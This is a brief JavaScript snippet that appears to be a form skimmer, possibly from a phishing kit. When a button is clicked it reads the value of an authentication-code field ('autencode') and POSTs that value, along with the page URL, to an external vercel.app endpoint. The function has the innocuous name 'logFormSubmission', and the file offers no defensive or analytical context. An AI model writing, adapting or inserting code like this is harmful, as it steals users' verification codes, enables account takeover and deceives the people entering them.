document.addEventListener('DOMContentLoaded', function () {
    function logFormSubmission(event) {
        const autencodeValue = document.getElementById('autencode').value;
        console.log('Code Auth:', autencodeValue);

        fetch('https://eiei01.vercel.app/api/jookgru', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                url: window.location.href,
                data: { autencode: autencodeValue },
            }),
        })
        .then(response => response.text())
        .then(text => console.log('Server response text:', text))
        .catch(error => console.error('There was a problem with the fetch operation:', error));
    }
    var submitButton = document.getElementById('submitAuten');
    submitButton.addEventListener('click', logFormSubmission);
});